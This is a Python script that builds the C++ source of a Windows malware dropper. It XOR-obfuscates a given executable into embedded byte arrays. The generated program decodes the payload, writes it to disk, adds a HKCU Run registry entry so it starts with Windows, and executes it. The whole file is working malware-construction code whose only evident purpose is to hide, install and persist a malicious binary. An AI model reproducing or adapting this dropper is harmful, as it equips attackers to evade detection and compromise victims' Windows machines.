malware_future_filename = "D:\\src\\malware_unxored.exe"

def write_xored_malware(out, malware_file_path, xored_max_size):

    index = 0
    str_size = 32
    byte_counter = 0
    malware_file = open(malware_file_path, "rb")

    malware_content = malware_file.read() 
    mcl = len(malware_content)
    for i in range(mcl):

        # We need to create another table, since the compiler of Visual Studio does
        # not initialize all the table when it is too big
        if i % xored_max_size == 0:
            if i > 0:
                out.write("\";\n\n")

            out.write("unsigned char xored{}[] = \"".format(index))
            index += 1
            byte_counter = 0

        elif byte_counter > 0 and byte_counter % str_size == 0 and i < (mcl - 1):
            out.write("\" \\\n\"")
            byte_counter = 0

        byte = hex(malware_content[i] ^ 0x35)[2:]

        if len(byte) == 1:
            byte = "0" + byte

        out.write("\\x" + byte)
        byte_counter += 1


    out.write("\";\n")

    malware_file.close()

    return index

def prefix(out):
    out.write("""
#include <stdio.h>
#include <stdlib.h>

#include <windows.h>

#define MALWARE_FILENAME		"dropped_malware.exe"
#define ABSOLUTE_FILE_PATH_SIZE		0x400

#define PERSISTENCE_HKEY		HKEY_CURRENT_USER
#define PERSISTENCE_REG_KEY		"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
#define PERSISTENCE_VALUE_NAME	"MalwarePath"


""".format(malware_future_filename.replace("\\", "\\\\")))

def suffix(out, buf_nb):
    out.write("""
void unxor(unsigned char *buf, size_t size, unsigned char key)
{
	size_t i;
	for (i = 0; i < size; i++) {
		buf[i] = buf[i] ^ key;
	}
}

void install_persistence(const char *filename, HKEY hkey, LPCSTR reg_key, LPCSTR value_name)
{
	LONG ret;
	HKEY opened_reg_key;

	ret = RegOpenKeyEx(hkey, reg_key, 0, KEY_ALL_ACCESS, &opened_reg_key);

	if (ret == ERROR_SUCCESS) {
		printf("Opened successfully the persistence key !\\n");
		RegSetKeyValue(opened_reg_key, NULL, value_name, REG_SZ, filename, strlen(filename));

	} else {
		printf("ERROR (%d) while opening the persistence key\\n", ret);
	}
}

int main()
{
	FILE *out;
        char cwd[0x200];
        char filename[ABSOLUTE_FILE_PATH_SIZE];
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

        GetCurrentDirectory(0x200, cwd);

        snprintf(filename, ABSOLUTE_FILE_PATH_SIZE, "%s\\\\%s", cwd, MALWARE_FILENAME);

	out = fopen(filename, "wb");

	if (out == NULL) {
		printf("Could not open '%s'\\n", filename);
		exit(1);
	}
""")
        
    for i in range(buf_nb):
        out.write("\n\tunxor(xored{0}, sizeof(xored{0}) - 1, 0x35);\n".format(i))
        out.write("\tfwrite(xored{0}, 1, sizeof(xored{0}) - 1, out);\n".format(i))
        
    out.write("""
	fclose(out);

	install_persistence(filename, PERSISTENCE_HKEY, PERSISTENCE_REG_KEY, PERSISTENCE_VALUE_NAME);

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);

	ZeroMemory(&pi, sizeof(pi));

	CreateProcess(NULL, (LPSTR)filename, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

	return 0;
}
""")


out_file_path       = "D:\\src\\Dropper\\dropper.cpp"
malware_file_path   = "D:\\src\\Malware1\\x64\\Debug\\Malware1.exe"

out_file = open(out_file_path, "w")

prefix(out_file)
buf_nb = write_xored_malware(out_file, malware_file_path, 0xb00)
suffix(out_file, buf_nb)

out_file.flush()
out_file.close()

